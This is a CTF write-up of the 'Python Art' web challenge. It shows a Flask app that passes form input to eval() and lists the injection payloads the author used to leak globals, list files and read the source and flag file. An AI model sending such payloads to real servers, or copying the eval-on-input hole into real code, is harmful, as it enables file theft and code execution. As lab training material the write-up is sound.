---
title: Marathon CTF
date: 2021-04-02 00:40:00 +0200
categories: [CTF, Writeups]
tags: ctf writeups reverse reverse-engineering web
image: /assets/img/posts/2021-04-02-Marathon-CTF/cover.jpg
---
{% assign img_root = "/assets/img/posts/2021-04-02-Marathon-CTF" %}

Marathon CTF was a great CTF organized by [CyberTalents](https://cybertalents.com/) during the whole month (1 Mar. - 31 Mar. 2021) but I participated during only the last 4 days and I got the 28th place (same points ad 25th) as I solved all Reverse challenges but one, and some of Web, Crypto, Forensics challenges and Here's the writeup for some of these challenges!

<hr>

## Python Art

<img src="{{img_root}}/info/python-art.png" alt="Python Art Info">

Well, This challenge I really liked because It's more like a reverse challenge or at least for me! :D
<img src="{{img_root}}/challenges/python-art/python-art.png" alt="Python Art website">

So this website basically draws "whatever" I typed like this:
<img src="{{img_root}}/challenges/python-art/test.png" alt="testing input">

Since the challenge name is "Python Art" I thought of Django or Flask, I wanted to see the HTML source using inspect element and there was an interesting comment inside the <pre> tag under the drawn text the comment was `<!-- test is not defined -->` or something like that so I guessed the comment is a result of eval()! I tired 2+3 as input and the result in the comment was 5 so YUP, that's eval() function messing with me I KNEW IT!

Because I'm a reverse guy I overthought it so I tried to get the flag variable but it was not defined, I thought it might be in a text file and tried to read `flag.txt` but didn't work either, then I tried to execute compile() function inside the eval function but none of that worked but that made me read about code objects in Python so I had fun.

since the URL is `http://18.196.160.18:3333/send` I tried the input `send` and the comment had this response `<!-- function send at 0xfff..... -->` so that's the address of the function in memory, huh!

so to get the properties and methods of the function send I tried `dir(send)` and the response was
```python
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
```

And by taking a look at func_globals by typing `send.func_globals` .. BOOM!:
```
'DEFAULT_FONT': 'standard',
'art': <function art at 0x7f2ce3b7b4d0>,
'Flask': <class 'flask.app.Flask'>,
'app': <Flask 'app'>,
'aprint': <function aprint at 0x7f2ce3b7b450>,
'DECORATION_COUNTER': 195,
'randart': <function randart at 0x7f2ce3b7b550>,
...
lots of gibberish stuff
...
'__file__': 'app.py',
'art_param': <module 'art.art_param' from '/usr/local/lib/python2.7/site-packages/art/art_param.pyc'>
...
'decor_dic': <module 'art.decor_dic' from '/usr/local/lib/python2.7/site-packages/art/decor_dic.pyc'>, 'request': <Request 'http://18.196.160.18:3333/send' [POST]>, 'ART_VERSION': '5.1', 'ART_COUNTER': 700
```

So this is a `Flask` web application written in `app.py` file and there's functions like `art`, `aprint`, `randart`, etc.. which belong to the [art](https://pypi.org/project/art/) python library! All makes sense now! :D

Since I have the filename of source code I grabbed it `open('app.py','r').read()` and styled it a little:

```python
#!/usr/bin/python
from flask import Flask
from flask import render_template
from flask import request
from art import *

app = Flask(__name__, static_url_path='/static')

@app.route('/')
def index():
	return render_template('index.html')


@app.route('/send', methods = ['POST'])
def send():
	text = request.form.get('name')
	art = text2art(str(text),font='block',chr_ignore=True)

	try:
		cmd = eval(text)
	except NameError as e:
	    return render_template('index.html', cmd=e , art= art)
	return render_template('index.html', cmd=cmd , art=art)


if __name__ == '__main__':
	app.run(host='0.0.0.0')
```

so as I thought the comment is using eval() function and all looks good, Now it's time to get the flag!

I typed `__import__('glob').glob("*")` to discover what's around (which I should've done at first BTW xD):
```html
<!-- [&#39;app.py&#39;, &#39;flag&#39;, &#39;templates&#39;, &#39;static&#39;] -->
```
Okay it's `flag` file, not `flag.txt`! then by reading that file `open('flag', 'r').read()` I've got the flag:
<img src="{{img_root}}/challenges/python-art/flag.png" alt="flag">
